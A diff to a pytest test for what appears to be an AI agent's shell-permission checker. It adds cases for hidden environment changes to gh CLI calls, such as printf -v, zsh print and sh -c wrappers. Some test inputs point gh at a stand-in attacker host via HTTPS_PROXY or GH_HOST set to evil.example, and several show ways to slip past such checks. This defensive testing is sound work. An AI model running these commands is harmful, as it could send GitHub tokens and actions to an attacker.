@@ -59,6 +59,14 @@ def test_a_variable_set_on_the_line_makes_every_gh_call_ask(name: str, form: str
         pytest.param("for GH_REPO in other/r; do gh issue comment 1 -b ok; done", id="a loop variable"),
         pytest.param('gh issue comment 1 -b "${GH_REPO:=other/r}"', id="a default assignment"),
         pytest.param("unset GH_HOST; gh pr view 1", id="an unset"),
+        pytest.param("printf -rv GH_REPO other/r; gh issue comment 1 -b ok", id="printf with a bundled -v"),
+        pytest.param("print -v GH_REPO other/r; gh issue comment 1 -b ok", id="zsh print into a variable"),
+        pytest.param(
+            "bash -c 'HTTPS_PROXY=http://evil.example gh issue comment 1 -R furedea/agent-config -b ok'",
+            id="an assignment inside a shell script",
+        ),
+        pytest.param("sh -c 'export GH_HOST=evil.example; gh pr view 1'", id="an export inside a shell script"),
+        pytest.param("sh -c 'gh pr view 1'", id="a read inside a shell script, whose environment the line hides"),
     ],
 )
 def test_other_ways_to_change_the_environment_ask(command: str) -> None:
